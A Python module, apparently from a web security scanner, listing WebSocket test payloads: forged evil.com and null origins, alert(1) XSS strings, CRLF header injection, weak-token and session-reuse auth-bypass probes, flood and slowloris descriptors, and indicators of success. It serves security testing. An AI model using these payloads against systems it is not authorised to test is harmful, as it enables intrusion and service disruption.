"""
WebSocket Security Payloads

Payloads for WebSocket security testing including:
- Cross-origin attacks
- Message injection
- Frame manipulation
- Authentication bypass
"""

# Cross-origin WebSocket attacks
WEBSOCKET_CROSS_ORIGIN = [
    {
        "name": "evil_origin",
        "payload": "http://evil.com",
        "description": "Evil origin header",
    },
    {
        "name": "null_origin",
        "payload": "null",
        "description": "Null origin header",
    },
    {
        "name": "file_origin",
        "payload": "file://",
        "description": "File protocol origin",
    },
    {
        "name": "data_origin",
        "payload": "data:text/html,",
        "description": "Data URI origin",
    },
]

# WebSocket message injection payloads
WEBSOCKET_MESSAGE_INJECTION = [
    {
        "name": "script_injection",
        "payload": '{"type":"message","content":"<script>alert(1)</script>"}',
        "description": "Script injection in WebSocket message",
    },
    {
        "name": "img_injection",
        "payload": '{"content":"<img src=x onerror=alert(1)>"}',
        "description": "Image tag injection",
    },
    {
        "name": "iframe_injection",
        "payload": '{"content":"<iframe srcdoc=\"<script>alert(1)</script>\""}',
        "description": "Iframe srcdoc injection",
    },
    {
        "name": "svg_injection",
        "payload": '{"content":"<svg onload=alert(1)>"}',
        "description": "SVG onload injection",
    },
]

# WebSocket opcode manipulation
WEBSOCKET_OPCODE = [
    {
        "name": "text_opcode",
        "payload": '{"opcode":1,"data":"test"}',
        "description": "Text opcode with malicious data",
    },
    {
        "name": "binary_opcode",
        "payload": '{"opcode":2,"data":"\\x00\\x01\\x02"}',
        "description": "Binary opcode with control chars",
    },
    {
        "name": "close_opcode",
        "payload": '{"opcode":8,"code":1000,"reason":"evil"}',
        "description": "Close opcode manipulation",
    },
    {
        "name": "ping_opcode",
        "payload": '{"opcode":9,"data":"evil"}',
        "description": "Ping opcode with malicious payload",
    },
]

# WebSocket frame manipulation
WEBSOCKET_FRAME = [
    {
        "name": "fragmented_frame",
        "payload": '{"fragment":1,"data":"malicious"}',
        "description": "Fragmented frame attack",
    },
    {
        "name": "compressed_frame",
        "payload": '{"compressed":true,"data":"malicious"}',
        "description": "Compressed frame injection",
    },
    {
        "name": "large_frame",
        "payload": 'A' * 10000,
        "description": "Large frame DoS",
    },
    {
        "name": "invalid_utf8",
        "payload": '\\xff\\xfe\\xfd\\xfc\\xfb\\xbf',
        "description": "Invalid UTF-8 sequence",
    },
]

# WebSocket authentication bypass
WEBSOCKET_AUTH_BYPASS = [
    {
        "name": "no_auth",
        "payload": '{"auth":false}',
        "description": "No authentication required",
    },
    {
        "name": "weak_token",
        "payload": '{"token":"123456"}',
        "description": "Weak token authentication",
    },
    {
        "name": "session_reuse",
        "payload": '{"session":"existing_session_id"}',
        "description": "Session reuse attack",
    },
    {
        "name": "user_enumeration",
        "payload": '{"user":"admin"}',
        "description": "User enumeration via WebSocket",
    },
]

# WebSocket protocol downgrade
WEBSOCKET_PROTOCOL = [
    {
        "name": "http_protocol",
        "payload": '{"protocol":"http"}',
        "description": "HTTP protocol downgrade",
    },
    {
        "name": "custom_protocol",
        "payload": '{"protocol":"evil-protocol"}',
        "description": "Custom protocol injection",
    },
]

# WebSocket header injection
WEBSOCKET_HEADER_INJECTION = [
    {
        "name": "cookie_injection",
        "payload": 'Cookie: session=evil\r\n',
        "description": "Cookie header injection",
    },
    {
        "name": "user_agent_injection",
        "payload": 'User-Agent: EvilWebSocket\r\n',
        "description": "User-Agent header injection",
    },
    {
        "name": "origin_injection",
        "payload": 'Origin: http://evil.com\r\n',
        "description": "Origin header injection",
    },
]

# WebSocket resource consumption
WEBSOCKET_DOS = [
    {
        "name": "connection_flood",
        "payload": '{"type":"connect_flood","count":10000}',
        "description": "Connection flood attack",
    },
    {
        "name": "message_flood",
        "payload": '{"type":"message_flood","count":10000}',
        "description": "Message flood DoS",
    },
    {
        "name": "ping_flood",
        "payload": '{"type":"ping_flood","count":10000}',
        "description": "Ping flood DoS",
    },
    {
        "name": "slow_loris",
        "payload": '{"type":"slowloris","delay":1000}',
        "description": "Slowloris style WebSocket attack",
    },
]

# WebSocket XSS via message reflection
WEBSOCKET_XSS = [
    {
        "name": "script_reflection",
        "payload": '<script>alert(1)</script>',
        "description": "Script reflection in WebSocket",
    },
    {
        "name": "event_handler",
        "payload": '<img src=x onerror=alert(1)>',
        "description": "Event handler injection",
    },
    {
        "name": "data_uri",
        "payload": 'data:text/html,<script>alert(1)</script>',
        "description": "Data URI injection",
    },
]

# WebSocket subprotocol attacks
WEBSOCKET_SUBPROTOCOL = [
    {
        "name": "subprotocol_injection",
        "payload": 'evil-protocol, chat',
        "description": "Subprotocol header injection",
    },
    {
        "name": "subprotocol_collision",
        "payload": 'http, https',
        "description": "Subprotocol collision",
    },
]

# WebSocket success indicators
WEBSOCKET_SUCCESS = [
    "connected",
    "authenticated",
    "subscribed",
    "joined",
    "message",
    "alert(1)",
    "evil.com",
]

# WebSocket vulnerability indicators
WEBSOCKET_VULN_INDICATORS = [
    "Origin allowed",
    "No authentication",
    "Message reflected",
    "Script executed",
    "Access denied",
]
